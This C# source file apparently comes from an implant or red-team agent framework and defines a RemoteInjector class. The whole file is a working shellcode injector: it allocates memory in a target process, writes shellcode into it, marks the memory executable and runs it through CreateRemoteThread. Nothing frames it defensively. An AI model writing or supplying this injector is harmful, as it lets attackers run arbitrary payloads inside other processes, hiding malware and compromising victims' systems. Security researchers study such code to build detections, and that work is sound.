﻿using Agent.Native;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Internal
{
    public class RemoteInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            var target = Process.GetProcessById(pid);
            var baseAddress = Native.Kernel32.VirtualAllocEx(
                target.Handle,
                IntPtr.Zero,
                shellcode.Length,
                Native.Kernel32.AllocationType.Commit | Native.Kernel32.AllocationType.Reserve,
                Native.Kernel32.MemoryProtection.ReadWrite);

            Native.Kernel32.WriteProcessMemory(
                target.Handle,
                baseAddress,
                shellcode,
                shellcode.Length,
                out _);

            Native.Kernel32.VirtualProtectEx(
                target.Handle,
                baseAddress,
                shellcode.Length,
                Native.Kernel32.MemoryProtection.ExecuteRead,
                out _);

            Native.Kernel32.CreateRemoteThread(
                target.Handle,
                IntPtr.Zero,
                0,
                baseAddress,
                IntPtr.Zero,
                0,
                out var threadId);

            return threadId != IntPtr.Zero;
        }
    }
}
